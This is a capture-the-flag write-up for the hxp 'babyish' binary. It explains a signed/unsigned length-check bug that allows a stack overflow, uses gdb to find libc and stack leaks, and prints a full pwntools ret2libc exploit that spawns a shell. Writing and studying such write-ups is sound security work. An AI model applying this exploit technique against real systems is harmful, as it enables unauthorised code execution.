# hxp babyish

Let's take a look at the binary:

```
$	file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c8387e8c3df7219eca08fac0cb76f8ac69557f3, not stripped
$	pwn checksec vuln
[*] '/Hackery/hxp/bbpwn/babyish/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we can see it is a 32 bit elf, with a non-executable stack. Let's look at the source code, which they gave to us:

```
#define _POSIX_C_SOURCE 1
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void greet(FILE *in, FILE *out)
{
    char buf[0x40];
    printf("Enter username: ");
    read(fileno(in), buf, 0x40);
    fprintf(out, "Hey %s", buf);
}

int num()
{
    static char buf[0x10];
    read(fileno(stdin), buf, 0x10);
    return atoi(buf);
}

int main()
{
    int len;
    char buf[0x40];

    setbuf(stdout, NULL);

    greet(stdin, stdout);
    sleep(1);

    printf("Enter length: ");
    if (0x40 <= (len = num())) {
        printf("No!\n");
        exit(1);
    }

    printf("Enter string (length %u): ", len);
    read(fileno(stdin), buf, len);
    printf("Thanks, bye!\n");
}
```

So we can see that it first establishes an int and char array of size `0x40`. Proceeding that, it runs the `greet` function which promts the user for input and stores it in a similar char array, and prints it out. Proceeding that it runs the `num` function which scans in ten bytes of data and returns the output of the `atoi` function on those ten bytes. If that number is greater than `0x40` the program exits. If the program doesn't exit, then it will read in that many bytes into the original buffer.

So if we can find a way to pass the length check with a number greater than `0x40`, we will have an overflow. Luckily for us we can. Read expects an unsigned integer for it's argument. However the comparison expects a signed integer. So what we can do is feed a negative number which will pass the check, however when it is interpreted as an unsigned integer it will give us plenty of space:

```
$	./vuln 
Enter username: guyinatuxedo
Hey guyinatuxedo
-Enter length: 128
Enter string (length 4294967168): 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Thanks, bye!
Segmentation fault (core dumped)
```

So we saw that it worked, and we were able to get a buffer overfow. Let's see the offset to the return address:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080486ef <+0>:	lea    ecx,[esp+0x4]
   0x080486f3 <+4>:	and    esp,0xfffffff0
   0x080486f6 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080486f9 <+10>:	push   ebp
   0x080486fa <+11>:	mov    ebp,esp
   0x080486fc <+13>:	push   esi
   0x080486fd <+14>:	push   ebx
   0x080486fe <+15>:	push   ecx
   0x080486ff <+16>:	sub    esp,0x5c
   0x08048702 <+19>:	call   0x8048570 <__x86.get_pc_thunk.bx>
   0x08048707 <+24>:	add    ebx,0x18f9
   0x0804870d <+30>:	mov    eax,DWORD PTR [ebx-0x8]
   0x08048713 <+36>:	mov    eax,DWORD PTR [eax]
   0x08048715 <+38>:	sub    esp,0x8
   0x08048718 <+41>:	push   0x0
   0x0804871a <+43>:	push   eax
   0x0804871b <+44>:	call   0x8048490 <setbuf@plt>
   0x08048720 <+49>:	add    esp,0x10
   0x08048723 <+52>:	mov    eax,DWORD PTR [ebx-0x8]
   0x08048729 <+58>:	mov    edx,DWORD PTR [eax]
   0x0804872b <+60>:	mov    eax,DWORD PTR [ebx-0xc]
   0x08048731 <+66>:	mov    eax,DWORD PTR [eax]
   0x08048733 <+68>:	sub    esp,0x8
   0x08048736 <+71>:	push   edx
   0x08048737 <+72>:	push   eax
   0x08048738 <+73>:	call   0x8048636 <greet>
   0x0804873d <+78>:	add    esp,0x10
   0x08048740 <+81>:	sub    esp,0xc
   0x08048743 <+84>:	push   0x1
   0x08048745 <+86>:	call   0x80484c0 <sleep@plt>
   0x0804874a <+91>:	add    esp,0x10
   0x0804874d <+94>:	sub    esp,0xc
   0x08048750 <+97>:	lea    eax,[ebx-0x1778]
   0x08048756 <+103>:	push   eax
   0x08048757 <+104>:	call   0x80484b0 <printf@plt>
   0x0804875c <+109>:	add    esp,0x10
   0x0804875f <+112>:	call   0x804869b <num>
   0x08048764 <+117>:	mov    DWORD PTR [ebp-0x1c],eax
   0x08048767 <+120>:	cmp    DWORD PTR [ebp-0x1c],0x3f
   0x0804876b <+124>:	jle    0x8048789 <main+154>
   0x0804876d <+126>:	sub    esp,0xc
   0x08048770 <+129>:	lea    eax,[ebx-0x1769]
   0x08048776 <+135>:	push   eax
   0x08048777 <+136>:	call   0x80484d0 <puts@plt>
   0x0804877c <+141>:	add    esp,0x10
   0x0804877f <+144>:	sub    esp,0xc
   0x08048782 <+147>:	push   0x1
   0x08048784 <+149>:	call   0x80484e0 <exit@plt>
   0x08048789 <+154>:	sub    esp,0x8
   0x0804878c <+157>:	push   DWORD PTR [ebp-0x1c]
   0x0804878f <+160>:	lea    eax,[ebx-0x1765]
   0x08048795 <+166>:	push   eax
   0x08048796 <+167>:	call   0x80484b0 <printf@plt>
   0x0804879b <+172>:	add    esp,0x10
   0x0804879e <+175>:	mov    esi,DWORD PTR [ebp-0x1c]
   0x080487a1 <+178>:	mov    eax,DWORD PTR [ebx-0xc]
   0x080487a7 <+184>:	mov    eax,DWORD PTR [eax]
   0x080487a9 <+186>:	sub    esp,0xc
   0x080487ac <+189>:	push   eax
   0x080487ad <+190>:	call   0x8048510 <fileno@plt>
   0x080487b2 <+195>:	add    esp,0x10
   0x080487b5 <+198>:	mov    edx,eax
   0x080487b7 <+200>:	sub    esp,0x4
   0x080487ba <+203>:	push   esi
   0x080487bb <+204>:	lea    eax,[ebp-0x5c]
   0x080487be <+207>:	push   eax
   0x080487bf <+208>:	push   edx
   0x080487c0 <+209>:	call   0x80484a0 <read@plt>
   0x080487c5 <+214>:	add    esp,0x10
   0x080487c8 <+217>:	sub    esp,0xc
   0x080487cb <+220>:	lea    eax,[ebx-0x174a]
   0x080487d1 <+226>:	push   eax
   0x080487d2 <+227>:	call   0x80484d0 <puts@plt>
   0x080487d7 <+232>:	add    esp,0x10
   0x080487da <+235>:	mov    eax,0x0
   0x080487df <+240>:	lea    esp,[ebp-0xc]
   0x080487e2 <+243>:	pop    ecx
   0x080487e3 <+244>:	pop    ebx
   0x080487e4 <+245>:	pop    esi
   0x080487e5 <+246>:	pop    ebp
   0x080487e6 <+247>:	lea    esp,[ecx-0x4]
   0x080487e9 <+250>:	ret    
End of assembler dump.
```

One thing to pay attention to, right before it returns it load `ecx-0x4` into `esp`. This means that our return address will have `0x4` subtracted from it. 

```
gdb-peda$ b *main+209
Breakpoint 1 at 0x80487c0: file vuln.c, line 39.
gdb-peda$ r
Starting program: /Hackery/hxp/bbpwn/babyish/vuln 
Enter username: guyinatuxedo
Hey guyinatuxedo
Enter length: -128
Enter string (length 4294967168): 
[----------------------------------registers-----------------------------------]
EAX: 0xffffd0bc --> 0x8048333 ("__libc_start_main")
EBX: 0x804a000 --> 0x8049f04 --> 0x1 
ECX: 0xffffab80 ("Enter string (length 4294967168): ")
EDX: 0x0 
ESI: 0xffffff80 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd118 --> 0x0 
ESP: 0xffffd0a0 --> 0x0 
EIP: 0x80487c0 (<main+209>:	call   0x80484a0 <read@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487bb <main+204>:	lea    eax,[ebp-0x5c]
   0x80487be <main+207>:	push   eax
   0x80487bf <main+208>:	push   edx
=> 0x80487c0 <main+209>:	call   0x80484a0 <read@plt>
   0x80487c5 <main+214>:	add    esp,0x10
   0x80487c8 <main+217>:	sub    esp,0xc
   0x80487cb <main+220>:	lea    eax,[ebx-0x174a]
   0x80487d1 <main+226>:	push   eax
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0xffffd0bc --> 0x8048333 ("__libc_start_main")
arg[2]: 0xffffff80 
[------------------------------------stack-------------------------------------]
0000| 0xffffd0a0 --> 0x0 
0004| 0xffffd0a4 --> 0xffffd0bc --> 0x8048333 ("__libc_start_main")
0008| 0xffffd0a8 --> 0xffffff80 
0012| 0xffffd0ac --> 0x8048764 (<main+117>:	mov    DWORD PTR [ebp-0x1c],eax)
0016| 0xffffd0b0 --> 0xf7ffd000 --> 0x23f3c 
0020| 0xffffd0b4 --> 0xf7ffd918 --> 0x0 
0024| 0xffffd0b8 --> 0xffffd0d0 --> 0xffffffff 
0028| 0xffffd0bc --> 0x8048333 ("__libc_start_main")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080487c0 in main () at vuln.c:39
39	    read(fileno(stdin), buf, len);
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ c
Continuing.
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Thanks, bye!

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x35414166 ('fAA5')
ECX: 0x41414a41 ('AJAA')
EDX: 0xf7faf870 --> 0x0 
ESI: 0x414b4141 ('AAKA')
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0x41416741 ('AgAA')
ESP: 0x41414a3d ('=JAA')
EIP: 0x80487e9 (<main+250>:	ret)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487e4 <main+245>:	pop    esi
   0x80487e5 <main+246>:	pop    ebp
   0x80487e6 <main+247>:	lea    esp,[ecx-0x4]
=> 0x80487e9 <main+250>:	ret    
   0x80487ea:	xchg   ax,ax
   0x80487ec:	xchg   ax,ax
   0x80487ee:	xchg   ax,ax
   0x80487f0 <__libc_csu_init>:	push   ebp
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x41414a3d
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x080487e9 in main () at vuln.c:41
41	}
gdb-peda$ pattern offset AAJA
AAJA found at offset: 79
```

So we can see that the hex string which is in the return address is `0x41414a3d`, which once you take into account the minus `0x4` means that that string is `AAJA`.  With that we can see that the offset to the return address is 80 (it starts with 0).  

Now that we have control over the return address, we can try to execute a return to system attack. In order to do this, we will need two infoleaks. One from libc (so we can figure out the addresses of `system` and `binsh`) and one from the stack (it expects the return address to store a pointer to the code, so we wil need to know where on the stack our rop chain is held).

With this the greet function will come in handy. We can see that it scans in input into a char array, then prints it out using puts. The thing about this is it does not write over the memory prior to being printed, so there should be data in there that we can leak. Since puts waits for a null terminator to stop printing, as long as there isn't a null byte between the start of our input and the addresses we need to leak, we should get the leak.

Let's see what we can leak:

```
gdb-peda$ disas greet
Dump of assembler code for function greet:
   0x08048636 <+0>:	push   ebp
   0x08048637 <+1>:	mov    ebp,esp
   0x08048639 <+3>:	push   ebx
   0x0804863a <+4>:	sub    esp,0x44
   0x0804863d <+7>:	call   0x8048570 <__x86.get_pc_thunk.bx>
   0x08048642 <+12>:	add    ebx,0x19be
   0x08048648 <+18>:	sub    esp,0xc
   0x0804864b <+21>:	lea    eax,[ebx-0x1790]
   0x08048651 <+27>:	push   eax
   0x08048652 <+28>:	call   0x80484b0 <printf@plt>
   0x08048657 <+33>:	add    esp,0x10
   0x0804865a <+36>:	sub    esp,0xc
   0x0804865d <+39>:	push   DWORD PTR [ebp+0x8]
   0x08048660 <+42>:	call   0x8048510 <fileno@plt>
   0x08048665 <+47>:	add    esp,0x10
   0x08048668 <+50>:	mov    edx,eax
   0x0804866a <+52>:	sub    esp,0x4
   0x0804866d <+55>:	push   0x40
   0x0804866f <+57>:	lea    eax,[ebp-0x48]
   0x08048672 <+60>:	push   eax
   0x08048673 <+61>:	push   edx
   0x08048674 <+62>:	call   0x80484a0 <read@plt>
   0x08048679 <+67>:	add    esp,0x10
   0x0804867c <+70>:	sub    esp,0x4
   0x0804867f <+73>:	lea    eax,[ebp-0x48]
   0x08048682 <+76>:	push   eax
   0x08048683 <+77>:	lea    eax,[ebx-0x177f]
   0x08048689 <+83>:	push   eax
   0x0804868a <+84>:	push   DWORD PTR [ebp+0xc]
   0x0804868d <+87>:	call   0x8048500 <fprintf@plt>
   0x08048692 <+92>:	add    esp,0x10
   0x08048695 <+95>:	nop
   0x08048696 <+96>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048699 <+99>:	leave  
   0x0804869a <+100>:	ret    
End of assembler dump.
gdb-peda$ b *greet+62
Breakpoint 1 at 0x8048674: file vuln.c, line 11.
gdb-peda$ r
Starting program: /Hackery/hxp/bbpwn/babyish/vuln 
Enter username: 
[----------------------------------registers-----------------------------------]
EAX: 0xffffd050 --> 0xf7ffd000 --> 0x23f3c 
EBX: 0x804a000 --> 0x8049f04 --> 0x1 
ECX: 0xffffab20 ("Enter username: ")
EDX: 0x0 
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b5db0 
EBP: 0xffffd098 --> 0xffffd118 --> 0x0 
ESP: 0xffffd040 --> 0x0 
EIP: 0x8048674 (<greet+62>:	call   0x80484a0 <read@plt>)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804866f <greet+57>:	lea    eax,[ebp-0x48]
   0x8048672 <greet+60>:	push   eax
   0x8048673 <greet+61>:	push   edx
=> 0x8048674 <greet+62>:	call   0x80484a0 <read@plt>
   0x8048679 <greet+67>:	add    esp,0x10
   0x804867c <greet+70>:	sub    esp,0x4
   0x804867f <greet+73>:	lea    eax,[ebp-0x48]
   0x8048682 <greet+76>:	push   eax
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0xffffd050 --> 0xf7ffd000 --> 0x23f3c 
arg[2]: 0x40 ('@')
[------------------------------------stack-------------------------------------]
0000| 0xffffd040 --> 0x0 
0004| 0xffffd044 --> 0xffffd050 --> 0xf7ffd000 --> 0x23f3c 
0008| 0xffffd048 --> 0x40 ('@')
0012| 0xffffd04c --> 0x8048642 (<greet+12>:	add    ebx,0x19be)
0016| 0xffffd050 --> 0xf7ffd000 --> 0x23f3c 
0020| 0xffffd054 --> 0x80482dc --> 0x62696c00 ('')
0024| 0xffffd058 --> 0xf7ffdad0 --> 0xf7ffda74 --> 0xf7fd3b18 --> 0xf7ffd918 --> 0x0 
0028| 0xffffd05c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048674 in greet (in=0xf7fae5a0 <_IO_2_1_stdin_>, 
    out=0xf7faed60 <_IO_2_1_stdout_>) at vuln.c:11
11	    read(fileno(in), buf, 0x40);
gdb-peda$ x/x $ebp-0x48
0xffffd050:	0xf7ffd000
```

and now for the buffer's contents

```
gdb-peda$ telescope 0xffffd050 16
0000| 0xffffd050 --> 0xf7ffd000 --> 0x23f3c 
0004| 0xffffd054 --> 0x80482dc --> 0x62696c00 ('')
0008| 0xffffd058 --> 0xf7ffdad0 --> 0xf7ffda74 --> 0xf7fd3b18 --> 0xf7ffd918 --> 0x0 
0012| 0xffffd05c --> 0x0 
0016| 0xffffd060 --> 0xffffd120 --> 0x1 
0020| 0xffffd064 --> 0xf7e04d18 --> 0x2a10 
0024| 0xffffd068 --> 0xf7e589eb (<setbuffer+11>:	add    edi,0x155615)
0028| 0xffffd06c --> 0x804a000 --> 0x8049f04 --> 0x1 
0032| 0xffffd070 --> 0x1 
0036| 0xffffd074 --> 0xf7fae000 --> 0x1b5db0 
0040| 0xffffd078 --> 0xffffd118 --> 0x0 
0044| 0xffffd07c --> 0xf7e5ebf5 (<setbuf+21>:	add    esp,0x1c)
0048| 0xffffd080 --> 0xf7faed60 --> 0xfbad2887 
0052| 0xffffd084 --> 0x0 
0056| 0xffffd088 --> 0x2000 ('')
0060| 0xffffd08c --> 0xf7e5ebe0 (<setbuf>:	sub    esp,0x10)
```

So we can see that at offset `24` there is the address of `setbuffer+11` which we can use as the libc leak. And at offset `16`we have a stack address that we can use for a stack leak. So with these two things, we can caluclate the address we need (code for this is in the github repo). 


Script output:
```
python leak.py 
[+] Starting local process './vuln': pid 9181
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/hxp/bbpwn/babyish/vuln" 9181
[+] Waiting for debugger: Done
d
Enter username: 
[*] Address of setbuffer: 0xf75859e0
[*] Stack leak: 0xff864840
Enter string (length 4294967168): 
[*] Switching to interactive mode
$ 
```

looking at the addresses in gdb-peda:
```
Breakpoint 1, 0x080487c5 in main () at vuln.c:39
39	    read(fileno(stdin), buf, len);
gdb-peda$ p setbuffer
$1 = {<text variable, no debug info>} 0xf75859e0 <setbuffer>
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0xff8647dc ("15935728\nH\206\377")
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7560060 <system>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7684a0f ("/bin/sh")
```

calculating the offsets in python:
```
>>> hex(0xff8647dc - 0xff864840)
'-0x64'
>>> hex(0xf7560060 - 0xf75859e0)
'-0x25980'
>>> hex(0xf7684a0f - 0xf75859e0)
'0xff02f'
```

So we can see here, the offset to the start of our ROP chain is `-0x64` from the stack address we have, system is `-0x25980` from setbuffer, and the offset for binsh is `0xff02f`. With this, we have everything needed for our exploit:

```
#Import pwntools
from pwn import *

#Establish the target process
target = process('./vuln')
gdb.attach(target)

#Prompt for input for a pasue
raw_input()

#Send the payload for the leak
leak_payload = "0"*16
print target.recvuntil("Enter username: ")
target.send(leak_payload)

#Scan in the infoleaks, filter them out, and calculate the needed address
leak = target.recvuntil("Enter length: ")
leak = leak.replace("Enter length: ", "")
setvbuf_adr = u32(leak[28:32]) - 11
buffer_adr = u32(leak[20:24]) - 0x64
system_adr = setvbuf_adr - 0x25980
binsh_adr = setvbuf_adr + 0xff02f
log.info("Address of setbuffer: " + hex(setvbuf_adr))
log.info("Address of system: " + hex(system_adr))
log.info("Address of binsh: " + hex(binsh_adr))
log.info("Address of buffer: " + hex(buffer_adr))

#Send -128 to allow a buffer overflow
target.sendline("-128")

#Form the payload to pop a shell, and send it
print target.recvuntil("Enter string (length 4294967168): ")
payload = p32(system_adr) + "pwnn" + p32(binsh_adr) + "0"*(0x50 - 12) + p32(buffer_adr + 4)
target.sendline(payload)

#Enjoy your shell
target.interactive()
```

btw the reason why there is four bytes of data inbetween the address of `system` and the address of `/bin/sh` is because that is where the `system` function expects it's argument.

```
$	python exploit.py 
[+] Starting local process './vuln': pid 9558
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/hxp/bbpwn/babyish/vuln" 9558
[+] Waiting for debugger: Done
Give me the flag
Enter username: 
[*] Address of setbuffer: 0xf75da9e0
[*] Address of system: 0xf75b5060
[*] Address of binsh: 0xf76d9a0f
[*] Address of buffer: 0xffcf684c
Enter string (length 4294967168): 
[*] Switching to interactive mode
Thanks, bye!
$ ls
core         leak.py            peda-session-ls.txt    vuln
exploit.py   libc.so.6            peda-session-vuln.txt  vuln.c
gadgets.txt  peda-session-dash.txt  readme.md
$ w
 14:05:41 up  2:56,  1 user,  load average: 0.25, 0.16, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               11:13    2:52m  1:36   0.03s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
```

Just like that, we popped a shell.
